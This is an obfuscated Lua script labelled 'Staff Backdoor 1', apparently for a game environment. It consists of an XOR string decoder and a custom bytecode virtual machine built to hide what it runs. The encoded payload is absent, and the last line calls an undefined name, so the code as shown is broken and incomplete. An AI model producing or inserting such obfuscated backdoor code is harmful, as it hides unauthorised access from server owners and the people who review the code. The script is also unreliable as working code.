-- Staff Backdoor 1
local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v24,v25) local v26={};for v41=1, #v24 do v6(v26,v0(v4(v1(v2(v24,v41,v41 + 1 )),v1(v2(v25,1 + (v41% #v25) ,1 + (v41% #v25) + 1 )))%256 ));end return v5(v26);end local v8=tonumber;local v9=string.byte;local v10=string.char;local v11=string.sub;local v12=string.gsub;local v13=string.rep;local v14=table.concat;local v15=table.insert;local v16=math.ldexp;local v17=getfenv or function() return _ENV;end ;local v18=setmetatable;local v19=pcall;local v20=select;local v21=unpack or table.unpack ;local v22=tonumber;local function v23(v27,v28,...) local v29=1;local v30;v27=v12(v11(v27,5),v7("\159\141","\126\177\163\187\69\134\219\167"),function(v42) if ((v9(v42,2)==81) or (4593<=2672)) then v30=v8(v11(v42,1,1));return "";else local v99=v10(v8(v42,16));if v30 then local v109=v13(v99,v30);v30=nil;return v109;else return v99;end end end);local function v31(v43,v44,v45) if (v45 or (1168>3156)) then local v100=(v43/(2^(v44-1)))%(2^(((v45-1) -(v44-1)) + 1)) ;return v100-(v100%1) ;else local v101=2^(v44-1) ;return (((v43%(v101 + v101))>=v101) and 1) or 0 ;end end local function v32() local v46=v9(v27,v29,v29);v29=v29 + 1 ;return v46;end local function v33() local v47,v48=v9(v27,v29,v29 + 2 );v29=v29 + 2 ;return (v48 * 256) + v47 ;end local function v34() local v49,v50,v51,v52=v9(v27,v29,v29 + 3 );v29=v29 + 4 ;return (v52 * 16777216) + (v51 * 65536) + (v50 * 256) + v49 ;end local function v35() local v53=v34();local v54=v34();local v55=1;local v56=(v31(v54,1,20) * (2^32)) + v53 ;local v57=v31(v54,21,31);local v58=((v31(v54,32)==1) and  -1) or 1 ;if ((v57==0) or (572>4486)) then if (v56==0) then return v58 * 0 ;else v57=1;v55=0;end elseif (v57==2047) then return ((v56==0) and (v58 * (1/0))) or (v58 * NaN) ;end return v16(v58,v57-1023 ) * (v55 + (v56/(2^52))) ;end local function v36(v59) local v60;if ((1404==1404) and  not v59) then v59=v34();if (v59==0) then return "";end end v60=v11(v27,v29,(v29 + v59) -1 );v29=v29 + v59 ;local v61={};for v75=1, #v60 do v61[v75]=v10(v9(v11(v60,v75,v75)));end return v14(v61);end local v37=v34;local function v38(...) return {...},v20("#",...);end local function v39() local v62={};local v63={};local v64={};local v65={v62,v63,nil,v64};local v66=v34();local v67={};for v77=1,v66 do local v78=v32();local v79;if ((v78==1) or (3748<2212)) then v79=v32()~=0 ;elseif ((v78==2) or (1180==2180)) then v79=v35();elseif (v78==3) then v79=v36();end v67[v77]=v79;end v65[3]=v32();for v81=1,v34() do local v82=v32();if ((4090<4653) and (v31(v82,1,1)==0)) then local v105=v31(v82,2,3);local v106=v31(v82,4,6);local v107={v33(),v33(),nil,nil};if (v105==0) then v107[3]=v33();v107[4]=v33();elseif ((v105==1) or (2652<196)) then v107[3]=v34();elseif ((4135<4817) and (v105==2)) then v107[3]=v34() -(2^16) ;elseif ((272==272) and (v105==3)) then v107[3]=v34() -(2^16) ;v107[4]=v33();end if ((100<=3123) and (v31(v106,1,1)==1)) then v107[2]=v67[v107[2]];end if ((v31(v106,2,2)==1) or (1369>4987)) then v107[3]=v67[v107[3]];end if ((v31(v106,3,3)==1) or (863>=4584)) then v107[4]=v67[v107[4]];end v62[v81]=v107;end end for v83=1,v34() do v63[v83-1 ]=v39();end return v65;end local function v40(v69,v70,v71) local v72=v69[1];local v73=v69[2];local v74=v69[3];return function(...) local v85=v72;local v86=v73;local v87=v74;local v88=v38;local v89=1;local v90= -1;local v91={};local v92={...};local v93=v20("#",...) -1 ;local v94={};local v95={};for v102=0,v93 do if ((v102>=v87) or (724>=1668)) then v91[v102-v87 ]=v92[v102 + 1 ];else v95[v102]=v92[v102 + 1 ];end end local v96=(v93-v87) + 1 ;local v97;local v98;while true do v97=v85[v89];v98=v97[1];if ((428<1804) and (v98<=11)) then if (v98<=5) then if ((v98<=2) or (3325>4613)) then if (v98<=0) then v95[v97[2]]=v95[v97[3]][v97[4]];elseif ((v98==1) or (4950<=4553)) then do return v95[v97[2]];end else local v148=v97[2];local v149=v97[4];local v150=v148 + 2 ;local v151={v95[v148](v95[v148 + 1 ],v95[v150])};for v202=1,v149 do v95[v150 + v202 ]=v151[v202];end local v152=v151[1];if v152 then v95[v150]=v152;v89=v97[3];else v89=v89 + 1 ;end end elseif (v98<=3) then v95[v97[2]]=v40(v86[v97[3]],nil,v71);elseif ((2665<=3933) and (v98==4)) then if  not v95[v97[2]] then v89=v89 + 1 ;else v89=v97[3];end elseif v95[v97[2]] then v89=v89 + 1 ;else v89=v97[3];end elseif ((3273==3273) and (v98<=8)) then if ((3824>409) and (v98<=6)) then local v127=v97[2];v95[v127](v21(v95,v127 + 1 ,v97[3]));elseif (v98>7) then local v153=v97[2];do return v21(v95,v153,v153 + v97[3] );end else v89=v97[3];end elseif ((2087==2087) and (v98<=9)) then local v128;local v129;v95[v97[2]]=v95[v97[3]];v89=v89 + 1 ;v97=v85[v89];v129=v97[2];v95[v129]=v95[v129]();v89=v89 + 1 ;v97=v85[v89];v129=v97[2];v128=v95[v97[3]];v95[v129 + 1 ]=v128;v95[v129]=v128[v97[4]];v89=v89 + 1 ;v97=v85[v89];v95[v97[2]]=v97[3];v89=v89 + 1 ;v97=v85[v89];v129=v97[2];v95[v129]=v95[v129](v21(v95,v129 + 1 ,v97[3]));v89=v89 + 1 ;v97=v85[v89];v129=v97[2];v128=v95[v97[3]];v95[v129 + 1 ]=v128;v95[v129]=v128[v97[4]];v89=v89 + 1 ;v97=v85[v89];v129=v97[2];v128=v95[v97[3]];v95[v129 + 1 ]=v128;v95[v129]=v128[v97[4]];v89=v89 + 1 ;v97=v85[v89];v95[v97[2]]=v97[3];v89=v89 + 1 ;v97=v85[v89];v129=v97[2];v95[v129]=v95[v129](v21(v95,v129 + 1 ,v97[3]));v89=v89 + 1 ;v97=v85[v89];if  not v95[v97[2]] then v89=v89 + 1 ;else v89=v97[3];end elseif ((v98>10) or (3404>4503)) then v95[v97[2]]=v97[3];else local v158=v97[2];v95[v158]=v95[v158](v21(v95,v158 + 1 ,v97[3]));end elseif (v98<=17) then if (v98<=14) then if ((v98<=12) or (3506<=1309)) then local v138=v97[2];local v139={v95[v138](v95[v138 + 1 ])};local v140=0;for v145=v138,v97[4] do v140=v140 + 1 ;v95[v145]=v139[v140];end elseif ((2955==2955) and (v98==13)) then local v160;local v161;v95[v97[2]]=v97[3];v89=v89 + 1 ;v97=v85[v89];v161=v97[2];v160=v95[v97[3]];v95[v161 + 1 ]=v160;v95[v161]=v160[v97[4]];v89=v89 + 1 ;v97=v85[v89];v95[v97[2]]=v95[v97[3]];v89=v89 + 1 ;v97=v85[v89];v95[v97[2]]={};v89=v89 + 1 ;v97=v85[v89];v95[v97[2]][v97[3]]=v97[4];v89=v89 + 1 ;v97=v85[v89];v95[v97[2]][v97[3]]=v97[4];v89=v89 + 1 ;v97=v85[v89];v95[v97[2]][v97[3]]=v97[4];v89=v89 + 1 ;v97=v85[v89];v161=v97[2];v95[v161](v21(v95,v161 + 1 ,v97[3]));v89=v89 + 1 ;v97=v85[v89];v161=v97[2];v160=v95[v97[3]];v95[v161 + 1 ]=v160;v95[v161]=v160[v97[4]];v89=v89 + 1 ;v97=v85[v89];v95[v97[2]]=v95[v97[3]];else v95[v97[2]]=v71[v97[3]];end elseif ((v98<=15) or (2903==1495)) then local v141=v97[2];v95[v141]=v95[v141](v95[v141 + 1 ]);elseif ((4546>=2275) and (v98>16)) then v95[v97[2]][v97[3]]=v97[4];else local v176=v97[2];local v177=v95[v97[3]];v95[v176 + 1 ]=v177;v95[v176]=v177[v97[4]];end elseif ((819>=22) and (v98<=20)) then if (v98<=18) then do return;end elseif (v98>19) then v95[v97[2]]={};else local v182;v95[v97[2]][v97[3]]=v97[4];v89=v89 + 1 ;v97=v85[v89];v95[v97[2]][v97[3]]=v97[4];v89=v89 + 1 ;v97=v85[v89];v95[v97[2]][v97[3]]=v97[4];v89=v89 + 1 ;v97=v85[v89];v95[v97[2]][v97[3]]=v97[4];v89=v89 + 1 ;v97=v85[v89];v182=v97[2];v95[v182](v21(v95,v182 + 1 ,v97[3]));v89=v89 + 1 ;v97=v85[v89];do return;end end elseif (v98<=22) then if ((3162==3162) and (v98>21)) then v95[v97[2]]=v95[v97[3]];else for v205=v97[2],v97[3] do v95[v205]=nil;end end elseif ((v98>23) or (2369>4429)) then local v189=v97[2];v95[v189]=v95[v189]();else local v191;local v192;v95[v97[2]]=v71[v97[3]];v89=v89 + 1 ;v97=v85[v89];v192=v97[2];v191=v95[v97[3]];v95[v192 + 1 ]=v191;v95[v192]=v191[v97[4]];v89=v89 + 1 ;v97=v85[v89];v95[v97[2]]=v97[3];v89=v89 + 1 ;v97=v85[v89];v192=v97[2];v95[v192]=v95[v192](v21(v95,v192 + 1 ,v97[3]));v89=v89 + 1 ;v97=v85[v89];v192=v97[2];v191=v95[v97[3]];v95[v192 + 1 ]=v191;v95[v192]=v191[v97[4]];v89=v89 + 1 ;v97=v85[v89];v95[v97[2]]=v97[3];v89=v89 + 1 ;v97=v85[v89];v192=v97[2];v95[v192]=v95[v192](v21(v95,v192 + 1 ,v97[3]));end v89=v89 + 1 ;end end;end return v40(v39(),{},v28)(...);end return v23(vv17(),...);
